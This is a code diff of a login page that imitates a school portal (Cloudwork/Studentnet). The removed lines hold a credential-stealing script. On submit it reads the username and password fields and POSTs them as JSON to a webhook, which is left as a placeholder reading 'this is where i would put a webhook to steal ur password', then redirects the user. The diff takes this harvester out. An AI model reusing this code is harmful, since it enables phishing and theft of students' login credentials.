@@ -63,7 +63,7 @@ meter::-webkit-meter-optimum-value {
 	<form action="?" method="post" name="f">
 
             <div class="submit">
- <input type="submit"  onclick="sendMessage(); this.disabled=true; this.value='Signing in...';" value="Start">
+ <input type="submit" href="signin" value="Start">
 </div>
           <p>Please note your username is not your email address, it is a unique code issued to you by the school.
 If you are having trouble logging in, please email <a href="mailto:portal@burgmann.act.edu.au">portal@burgmann.act.edu.au</a><br /><br />
@@ -74,30 +74,5 @@ If you are having trouble logging in, please email <a href="mailto:portal@burgma
     </div>
     <div class="footer">Cloudwork&reg; Copyright &copy; 2021 <a href="http://studentnet.net">Studentnet&reg;</a> | Powered by <a href="http://coherentcloud.com">Coherent Cloud&reg;</a></div>
   </body>
-<script type="text/javascript">
-    function la(src) {
-      window.location=src;
-    }
-  </script>
 
-  <script>
-  function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
-}
-    var request = new XMLHttpRequest();
-    request.open("POST", "this is where i would put a webhook to steal ur password");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-    }
-    request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("signin");
-  }
-  </script>
 </html>
